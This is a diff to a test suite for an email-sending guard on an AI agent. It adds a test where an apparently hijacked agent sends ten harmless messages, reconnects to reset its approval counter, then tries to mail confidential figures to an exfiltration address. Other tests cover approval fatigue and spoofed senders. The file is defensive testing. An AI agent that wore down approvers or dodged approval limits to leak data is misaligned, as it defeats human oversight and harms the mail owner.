@@ -65,7 +65,7 @@ def test_25_thirty_harmless_approvals_then_a_bad_one(world: WorldFactory) -> Non
     assert bad.new_recipients == [EXFIL]
     assert bad.outside_recipients == [EXFIL]
     assert bad.body_sha256 != first.body_sha256
-    assert bad.requires_full_view  # more than 10 approvals in this session
+    assert bad.requires_full_view  # more than 10 approvals by this agent today
     assert not result.ok
     assert all(m.to == ["alice@work.test"] for m in w.backend.sent)
 
@@ -83,3 +83,19 @@ def test_27_spoofed_known_contact_taints(world: WorldFactory) -> None:
     w.call("read_message", message_id="m_spoof")  # From bob@work.test, auth fail
     assert w.session.tainted
     assert "authentication" in w.session.taint_reason
+
+
+def test_28_reconnect_does_not_reset_the_approval_bar(world: WorldFactory) -> None:
+    """Ten harmless approvals, reconnect, then the bad send: the bar must still be raised."""
+    w = world(default=APPROVED, views_full_body=True)
+    for _ in range(10):
+        assert w.call("send_mail", to=["alice@work.test"], subject="ok", body="ok").ok
+    w.reconnect()  # the hijacked agent drops the connection to reset the counter
+    w.approver.views_full_body = False
+    result = w.call("send_mail", to=[EXFIL, "alice@work.test"], subject="ok", body="Q3: 4.2M")
+    bad = w.approver.requests[-1]
+    assert bad.approval_number == 11
+    assert bad.requires_full_view
+    assert bad.new_recipients == [EXFIL]  # alice was approved before the reconnect
+    assert result.approval == ApprovalOutcome.UNVIEWED
+    assert all(m.to == ["alice@work.test"] for m in w.backend.sent)
